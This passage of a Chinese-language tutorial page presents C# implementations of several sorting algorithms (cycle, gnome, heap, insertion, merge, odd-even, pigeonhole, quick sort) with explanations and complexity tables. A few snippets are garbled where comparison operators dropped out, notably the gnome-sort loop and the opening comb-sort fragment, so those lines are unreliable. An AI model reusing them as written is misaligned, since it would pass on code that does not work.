        if (gap  0)
            {
                object temp = arrayToSort[i];
                arrayToSort[i] = arrayToSort[i + gap];
                arrayToSort[i + gap] = temp;
                RedrawItem(i);
                RedrawItem(i + gap);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
                swaps = 1;
            }
            i++;
        } while (!(i + gap &amp;gt;= arrayToSort.Count));

    } while (!(gap == 1 &amp;amp;&amp;amp; swaps == 0));

    return arrayToSort;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;圈排序&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/ddee89eebf96d043cc5deeaa07cabd2b.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;Cycle sort&lt;/b&gt; is an in-place, &lt;a title=&quot;Sorting algorithm&quot; href=&quot;http://en.wikipedia.org/wiki/Sorting_algorithm#Stability&quot;&gt;unstable&lt;/a&gt; &lt;a title=&quot;Sorting algorithm&quot; href=&quot;http://en.wikipedia.org/wiki/Sorting_algorithm&quot;&gt;sorting algorithm&lt;/a&gt;, a &lt;a title=&quot;Comparison sort&quot; href=&quot;http://en.wikipedia.org/wiki/Comparison_sort&quot;&gt;comparison sort&lt;/a&gt; that is theoretically optimal in terms of the total number of writes to the original &lt;a title=&quot;Array data structure&quot; href=&quot;http://en.wikipedia.org/wiki/Array_data_structure&quot;&gt;array&lt;/a&gt;, unlike any other in-place sorting algorithm. It is based on the idea that the &lt;a title=&quot;Permutation&quot; href=&quot;http://en.wikipedia.org/wiki/Permutation&quot;&gt;permutation&lt;/a&gt; to be sorted can be factored into &lt;a title=&quot;Cycle (mathematics)&quot; href=&quot;http://en.wikipedia.org/wiki/Cycle_(mathematics)&quot;&gt;cycles&lt;/a&gt;, which can individually be rotated to give a sorted result.&lt;/p&gt;
&lt;p&gt;Unlike nearly every other sort, items are &lt;i&gt;never&lt;/i&gt; written elsewhere in the array simply to push them out of the way of the action. Each value is either written zero times, if it’s already in its correct position, or written one time to its correct position. This matches the minimal number of overwrites required for a completed in-place sort.&lt;/p&gt;
&lt;p&gt;它是一个就地、不稳定的排序算法，根据原始的数组，一种理论上最优的比较，并且与其它就地排序算法不同。它的思想是把要排的数列分解为圈，即可以分别旋转得到排序结果。&lt;/p&gt;
&lt;p&gt;不同于其它排序的是，元素不会被放入数组的中任意位置从而推动排序。每个值如果它已经在其正确的位置则不动，否则只需要写一次即可。也就是说仅仅最小覆盖就能完成排序。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList CycleSort(IList arrayToSort)
{
    int writes = 0;
    for (int cycleStart = 0; cycleStart &amp;lt; arrayToSort.Count; cycleStart++)
    {
        object item = arrayToSort[cycleStart];
        int pos = cycleStart;

        do
        {
            int to = 0;
            for (int i = 0; i &amp;lt; arrayToSort.Count; i++)
            {
                if (i != cycleStart &amp;amp;&amp;amp; ((IComparable)arrayToSort[i]).CompareTo(item) &amp;lt; 0)
                {
                    to++;
                }
            }
            if (pos != to)
            {
                while (pos != to &amp;amp;&amp;amp; ((IComparable)item).CompareTo(arrayToSort[to]) == 0)
                {
                    to++;
                }

                object temp = arrayToSort[to];
                arrayToSort[to] = item;
                RedrawItem(to);
                item = temp;
                RedrawItem(cycleStart);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
                writes++;
                pos = to;
            }
        } while (cycleStart != pos);
    }
    return arrayToSort;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;地精排序&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/ad48f37b089673609bcc83dca8f1ae54.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;地精排序（gnome sorting，大部分地方翻成“侏儒排序”，“地精排序”明明更好听呀，本文就这么用了。）最初由哈米德在2000年的时候提出，当时称为傻瓜排序，之后被迪克说明并且命名为“地精排序”。除了某个元素是经过一系列的互换（类似冒泡排序）才到了它的正确位置之外，它和插入排序挺相似。&lt;/p&gt;
&lt;p&gt;它在概念上很简单，不需要嵌套循环。运行时间是O(n&lt;sup&gt;2&lt;/sup&gt;)，如果列表基本有序，则时间为O(n)。实际上，它和插入排序一样，平均运行时O(n&lt;sup&gt;2&lt;/sup&gt;)。&lt;/p&gt;
&lt;p&gt;The algorithm always finds the first place where two adjacent elements are in the wrong order, and swaps them. It takes advantage of the fact that performing a swap can introduce a new out-of-order adjacent pair only right before or after the two swapped elements. It does not assume that elements forward of the current position are sorted, so it only needs to check the position directly before the swapped elements.&lt;/p&gt;
&lt;p&gt;地精算法总是发现第一个 【两个相邻元素存在错误的顺序】，然后把他们交换。原理是，交换一对乱序元素后，会产生一对新的无序相邻元素，而这两个元素要么交换前有序，要么交换后有序。它不认为元素当前的位置是有序的，所以它只需要在交换元素前直接检查位置。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList GnomeSort(IList arrayToSort)
{
    int pos = 1;
    while (pos = 0)
        {
            pos++;
        }
        else
        {
            object temp = arrayToSort[pos];
            arrayToSort[pos] = arrayToSort[pos - 1];
            RedrawItem(pos);

            arrayToSort[pos - 1] = temp;
            RedrawItem(pos - 1);
            RefreshPanel(pnlSamples);
            if (savePicture)
                SavePicture();
            if (pos &amp;gt; 1)
            {
                pos--;
            }
        }
    }
    return arrayToSort;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%A0%86%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;堆排序&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/c4125c2ef7da00a2fbdf5ec02ecae116.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;堆排序是从数据集构建一个数据堆，然后提取最大元素，把它放到部分有序的数组的末尾。提取最大元素后，重新构建新堆，然后又接着提取新堆这的最大元素。重复这个过程，直到堆中没有元素并且数组已排好。堆排序的基本实现需要两个数组：一个用于构建堆，另一个是存放有序的元素。&lt;/p&gt;
&lt;p&gt;堆排序把输入数组插入到一个二叉堆的数据结构中。最大值（大根堆）或最小值（小根堆）会被提取出来，直到堆空为止，提取出来的元素，是已经排好序的。每次提取后，堆中没变换的元素依然保留了，所以（堆排序的）唯一消耗就是提取过程。&lt;/p&gt;
&lt;p&gt;在提取过程中，所需要的空间，就是用于存放堆的空间。为了实现恒定的空间开销，堆是存储在输入数组中还没有完成排序的那部分空间中。堆排序使用了两个堆操作：插入和根删除。每个提取的元素放到数组的最后一个空位置。数组剩余位置存放待排元素。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList HeapSort(IList list)
{
    for (int i = (list.Count - 1) / 2; i &amp;gt;= 0; i--)
        Adjust(list, i, list.Count - 1);

    for (int i = list.Count - 1; i &amp;gt;= 1; i--)
    {
        object Temp = list[0];
        list[0] = list[i];
        list[i] = Temp;
        RedrawItem(0);
        RedrawItem(i);
        pnlSamples.Refresh();
        if (chkCreateAnimation.Checked)
            SavePicture();
        Adjust(list, 0, i - 1);

    }

    return list;
}

public void Adjust(IList list, int i, int m)
{
    object Temp = list[i];
    int j = i * 2 + 1;
    while (j &amp;lt;= m)
    {
        if (j &amp;lt; m)
            if (((IComparable)list[j]).CompareTo(list[j + 1]) &amp;lt; 0)
                j = j + 1;

        if (((IComparable)Temp).CompareTo(list[j]) &amp;lt; 0)
        {
            list[i] = list[j];
            RedrawItem(i);
            pnlSamples.Refresh();
            if (chkCreateAnimation.Checked)
                SavePicture();
            i = j;
            j = 2 * i + 1;
        }
        else
        {
            j = m + 1;
        }
    }
    list[i] = Temp;
    RedrawItem(i);
    pnlSamples.Refresh();
    if (chkCreateAnimation.Checked)
        SavePicture();
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E6%8F%92%E5%85%A5%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;插入排序&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;strong&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/f8ae134fc6dbe50f19dcd3ef7ecf86bd.jpg&quot;&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;插入排序的工作原理是通过构建有序序列，对于未排序数据，在已排序序列中从后向前扫描，找到相应位置并插入。&lt;b&gt;插入排序&lt;/b&gt;在实现上，通常采用in-place排序（即只需用到O(1)的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。&lt;/p&gt;
&lt;p&gt;具体算法描述如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;从第一个元素开始，该元素可以认为已经被排序&lt;/li&gt;
&lt;li&gt;取出下一个元素，在已经排序的元素序列中从后向前扫描&lt;/li&gt;
&lt;li&gt;如果该元素（已排序）大于新元素，将该元素移到下一位置&lt;/li&gt;
&lt;li&gt;重复步骤3，直到找到已排序的元素小于或者等于新元素的位置&lt;/li&gt;
&lt;li&gt;将新元素插入到该位置后&lt;/li&gt;
&lt;li&gt;重复步骤2~5&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList InsertionSort(IList arrayToSort)
{
    for (int i = 1; i &amp;lt; arrayToSort.Count; i++)
    {
        object val = arrayToSort[i];
        int j = i - 1;
        bool done = false;
        do
        {
            if (((IComparable)arrayToSort[j]).CompareTo(val) &amp;gt; 0)
            {
                arrayToSort[j + 1] = arrayToSort[j];
                RedrawItem(j + 1);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
                j--;
                if (j &amp;lt; 0)
                {
                    done = true;
                }
            }
            else
            {
                done = true;
            }

        } while (!done);
        arrayToSort[j + 1] = val;

        RedrawItem(j + 1);
        pnlSamples.Refresh();
        if (chkCreateAnimation.Checked)
            SavePicture();
    }
    return arrayToSort;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(1)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;归并排序&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/8fbbc1bd887c37a613d9ecbb54d461c4.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;从概念上讲，归并排序的工作原理如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果列表的长度是0或1，那么它已经有序。否则：&lt;/li&gt;
&lt;li&gt;未排序的部分平均划分为两个子序列。&lt;/li&gt;
&lt;li&gt;每个子序列，递归使用归并排序。&lt;/li&gt;
&lt;li&gt;合并两个子列表，使之整体有序。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;归并排序包含两个主要观点，以改善其运行时：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;一个小列表排序的花费少于大列表。&lt;/li&gt;
&lt;li&gt;把两个有序表合并，要比直接排列一个无序表花费更少的步骤。例如，您只需要遍历每个有序列表一次即可(见下面的合并功能)。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;归并操作的过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;申请空间，使其大小为两个已经排序序列之和，该空间用来存放合并后的序列&lt;/li&gt;
&lt;li&gt;设定两个指针，最初位置分别为两个已经排序序列的起始位置&lt;/li&gt;
&lt;li&gt;比较两个指针所指向的元素，选择相对小的元素放入到合并空间，并移动指针到下一位置&lt;/li&gt;
&lt;li&gt;重复步骤3直到某一指针到达序列尾&lt;/li&gt;
&lt;li&gt;将另一序列剩下的所有元素直接复制到合并序列尾&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList MergeSort(IList a, int low, int height)
{
    int l = low;
    int h = height;

    if (l &amp;gt;= h)
    {
        return a;
    }

    int mid = (l + h) / 2;

    MergeSort(a, l, mid);
    MergeSort(a, mid + 1, h);

    int end_lo = mid;
    int start_hi = mid + 1;
    while ((l &amp;lt;= end_lo) &amp;amp;&amp;amp; (start_hi &amp;lt;= h))
    {
        if (((IComparable)a[l]).CompareTo(a[start_hi]) &amp;lt; 0)
        {
            l++;
        }
        else
        {
            object temp = a[start_hi];
            for (int k = start_hi - 1; k &amp;gt;= l; k--)
            {
                a[k + 1] = a[k];
                RedrawItem(k + 1);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
            }
            a[l] = temp;
            RedrawItem(l);
            pnlSamples.Refresh();
            if (chkCreateAnimation.Checked)
                SavePicture();
            l++;
            end_lo++;
            start_hi++;
        }
    }
    return a;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;奇偶排序&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/26e906fb7009059736d239dbe526ab51.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;Odd-even sort is a relatively simple sorting algorithm. It is a comparison sort based on bubble sort with which it shares many characteristics. It functions by comparing all (odd, even)-indexed pairs of adjacent elements in the list and, if a pair is in the wrong order (the first is larger than the second) the elements are switched. The next step repeats this for (even, odd)-indexed pairs (of adjacent elements). Then it alternates between (odd, even) and (even, odd) steps until the list is sorted. It can be thought of as using parallel processors, each using bubble sort but starting at different points in the list (all odd indices for the first step). This sorting algorithm is only marginally more difficult than bubble sort to implement.&lt;/p&gt;
&lt;p&gt;奇偶排序是一个相对简单的排序算法。它是一种基于冒泡排序的比较算法，它们有着许多共同点。它通过比较所有相邻的(奇数偶)对进行排序，如果某对存在错误的顺序(第一个元素大于第二个)，则交换。下一步针对｛偶奇对｝重复这一操作。然后序列就在(奇，偶)和(偶，奇)之间变换，直到列表有序。它可以看作是是使用并行处理器，每个都用了冒泡排序，但只是起始点在列表的不同位置(所有奇数位置可做第一步)。这个排序算法实现起来只是略微比冒泡排序复杂一些。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList OddEvenSort(IList arrayToSort)
{
    bool sorted = false;
    while (!sorted)
    {
        sorted = true;
        for (var i = 1; i &amp;lt; arrayToSort.Count - 1; i += 2)
        {
            if (((IComparable)arrayToSort[i]).CompareTo(arrayToSort[i + 1]) &amp;gt; 0)
            {
                object temp = arrayToSort[i];
                arrayToSort[i] = arrayToSort[i + 1];
                RedrawItem(i);
                arrayToSort[i + 1] = temp;
                RedrawItem(i+1);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
                sorted = false;
            }
        }

        for (var i = 0; i &amp;lt; arrayToSort.Count - 1; i += 2)
        {
            if (((IComparable)arrayToSort[i]).CompareTo(arrayToSort[i + 1]) &amp;gt; 0)
            {
                object temp = arrayToSort[i];
                arrayToSort[i] = arrayToSort[i + 1];
                arrayToSort[i + 1] = temp;
                RedrawItem(i);
                RedrawItem(i+1);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
                sorted = false;
            }
        }
    }
    return arrayToSort;
}&lt;/pre&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E9%B8%BD%E5%B7%A2%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;鸽巢排序&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;鸽巢排序，也被称为 count sort （不要和 counting sort 搞混了），当数组元素的元素数量（n）和可能的键值数（key value，N）大约相同时，这种排序算法实用。它的时间复杂度为O(&lt;i&gt;n+N&lt;/i&gt;)。&lt;/p&gt;
&lt;p&gt;（在不可避免遍历每一个元素并且排序的情况下效率最好的一种排序算法。但它只有在差值(或者可被映射在差值)很小的范围内的数值排序的情况下实用。）&lt;/p&gt;
&lt;p&gt;算法流程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Given an array of values to be sorted, set up an auxiliary array of initially empty “pigeonholes”, one pigeonhole for each key through the range of the original array. 假设有个一个待排序的数组，给它建立了一个空的辅助数组（称为“鸽巢”）。把原始数组中的每个值作为一个key(“格子”)。&lt;/li&gt;
&lt;li&gt;Going over the original array, put each value into the pigeonhole corresponding to its key, such that each pigeonhole eventually contains a list of all values with that key. 遍历原始数组，根据每个值放入辅助数组对应的“格子”&lt;/li&gt;
&lt;li&gt;Iterate over the pigeonhole array in order, and put elements from non-empty pigeonholes back into the original array. 顺序遍历“鸽巢”数组（辅助数组），把非空鸽巢中的元素放回原始数组。&lt;/li&gt;
&lt;/ul&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList PigeonHoleSort(IList list)
{
    object min = list[0], max = list[0];
    foreach (object x in list)
    {
        if (((IComparable)min).CompareTo(x) &amp;gt; 0)
        {
            min = x;
        }
        if (((IComparable)max).CompareTo(x) &amp;lt; 0)
        {
            max = x;
        }
        Thread.Sleep(speed);
    }

    int size = (int)max - (int)min + 1;

    int[] holes = new int[size];

    foreach (int x in list)
        holes[x - (int)min]++;

    int i = 0;
    for (int count = 0; count &amp;lt; size; count++)
        while (holes[count]-- &amp;gt; 0)
        {

            list[i] = count + (int)min;
            RedrawItem(i);
            i++;
            RefreshPanel(pnlSamples);
            Thread.Sleep(speed);
        }
    return list;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n+2&lt;sup&gt;k&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;-&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n+2&lt;sup&gt;k&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(2&lt;sup&gt;k&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;快速排序&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/d92358784b3413cc06ebc169bf44ba4e.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;快速排序采用分而治之的策略，把一个列表划分为两个子列表。步骤是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从列表中，选择一个元素，称为基准（pivot）。&lt;/li&gt;
&lt;li&gt;重新排序列表，把所有数值小于枢轴的元素排到基准之前，所有数值大于基准的排基准之后(相等的值可以有较多的选择)。在这个分区退出之后，该基准就处于数列的中间位置。这个称为&lt;b&gt;分区（partition）&lt;/b&gt;操作。&lt;/li&gt;
&lt;li&gt;分别递归排序较大元素的子列表和较小的元素的子列表。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;递归的结束条件是列表元素为零或一个，即已不需要排序。&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList QuickSort(IList a, int left, int right)
{
    int i = left;
    int j = right;
    double pivotValue = ((left + right) / 2);
    int x = (int)a[int.Parse(pivotValue.ToString())];

    while (i &amp;lt;= j)
    {
        while (((IComparable)a[i]).CompareTo(x) &amp;lt; 0)
        {
            i++;
        }
        while (((IComparable)x).CompareTo(a[j]) &amp;lt; 0)
        {
            j--;
        }
        if (i &amp;lt;= j)
        {
            object temp = a[i];
            a[i] = a[j];
            RedrawItem(i);
            i++;
            a[j] = temp;
            RedrawItem(j);
            j--;
            pnlSamples.Refresh();
            if (chkCreateAnimation.Checked)
                SavePicture();
        }
    }
    if (left &amp;lt; j)
    {
        QuickSort(a, left, j);
    }
    if (i &amp;lt; right)
    {
        QuickSort(a, i, right);
    }
    return a;
}&lt;/pre&gt;
&lt;table&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n&lt;sup&gt;2&lt;/sup&gt;)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Best case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Average case performance:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(n log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;right&quot;&gt;&lt;strong&gt;Worst case space complexity:&lt;/strong&gt;&lt;/td&gt;
&lt;td&gt;O(log n)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;使用冒泡的快速排序&lt;/h4&gt;
&lt;p&gt;&lt;img alt=&quot;&quot; src=&quot;/images/jobbole.com/a584cf3486b40fa7b964f4b1b6a0a3f8.jpg&quot;&gt;&lt;/p&gt;
&lt;pre class=&quot;brush: csharp; gutter: true&quot;&gt;public IList BubbleSort(IList arrayToSort, int left, int right)
{
    for (int i = left; i &amp;lt; right; i++)
    {
        for (int j = right; j &amp;gt; i; j--)
        {
            if (((IComparable)arrayToSort[j - 1]).CompareTo(arrayToSort[j]) &amp;gt; 0)
            {
                object temp = arrayToSort[j - 1];
                arrayToSort[j - 1] = arrayToSort[j];
                RedrawItem(j-1);
                arrayToSort[j] = temp;
                RedrawItem(j);
                pnlSamples.Refresh();
                if (chkCreateAnimation.Checked)
                    SavePicture();
            }
        }
    }

    return arrayToSort;
}

public IList QuickSortWithBubbleSort(IList a, int left, int right)
{
    int i = left;
    int j = right;

    if (right - left &amp;lt;= 6)
    {
        BubbleSort(a, left, right);
        return a;
    }

    double pivotValue = ((left + right) / 2);
    int x = (int)a[int.Parse(pivotValue.ToString())];

    a[(left + right) / 2] = a[right];
    a[right] = x;
    RedrawItem(right);
    pnlSamples.Refresh();
    if (chkCreateAnimation.Checked)
        SavePicture();

    while (i &amp;lt;= j)
    {
        while (((IComparable)a[i]).CompareTo(x) &amp;lt; 0)
        {
            i++;
        }
        while (((IComparable)x).CompareTo(a[j]) &amp;lt; 0)
        {
            j--;
        }

        if (i &amp;lt;= j)
        {
            object temp = a[i];
            a[i++] = a[j];
            RedrawItem(i - 1);
            a[j--] = temp;
            RedrawItem(j + 1);
            pnlSamples.Refresh();
            if (chkCreateAnimation.Checked)
                SavePicture();
        }
    }
    if (left &amp;lt; j)
    {
        QuickSortWithBubbleSort(a, left, j);
    }
    if (i &amp;lt; right)
    {
        QuickSortWithBubbleSort(a, i, right);
    }

    return a;
}&lt;/pre&gt;
&lt;h4&gt;&lt;/h4&gt;
&lt;h4&gt;&lt;a href=&quot;http://zh.wikipedia.org/wiki/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F&quot; target=&quot;_blank&quot;&gt;选择排序&lt;/a&gt;&lt;/h4&gt;
